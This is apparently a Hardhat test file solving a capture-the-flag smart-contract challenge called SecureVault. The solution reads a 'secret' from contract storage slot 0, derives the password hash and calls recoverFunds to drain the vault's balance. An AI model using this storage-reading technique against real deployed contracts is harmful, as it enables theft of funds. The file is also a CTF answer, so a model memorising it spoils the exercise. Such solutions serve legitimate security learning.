const { expect } = require('chai')
const { ethers } = require('hardhat')

// run the test
// npx hardhat test ./test/N1-SecureVault-easy.js
describe('CTF #1 SecureVault', function () {
  let challengeInstance, deployer

  before(async function () {
    ;[deployer] = await ethers.getSigners()

    const Challenge = await ethers.getContractFactory('N1SecureVault')
    challengeInstance = await Challenge.deploy({ value: ethers.utils.parseEther('0.0001') })
    await challengeInstance.deployed()
  })

  it('Should recover all funds', async function () {
    // Your code goes here

    // Get the "secret" at storage location 0
    secret = parseInt(await ethers.provider.getStorageAt(challengeInstance.address, 0))

    // Declare ETH amount to send to the function
    sendAmount = ethers.utils.parseEther('0.0001')

    // Get contract balance + value we're about to send
    contractBalance = (await ethers.provider.getBalance(challengeInstance.address)).add(sendAmount)

    // Get the password as a string number
    password = String(
      BigInt(
        ethers.utils.keccak256(
          ethers.utils.solidityPack(['uint256', 'uint256'], [secret, contractBalance])
        )
      )
    )

    // Attack
    await challengeInstance.recoverFunds(password, { value: sendAmount })
    expect(await ethers.provider.getBalance(challengeInstance.address)).to.equal('0')
  })
})
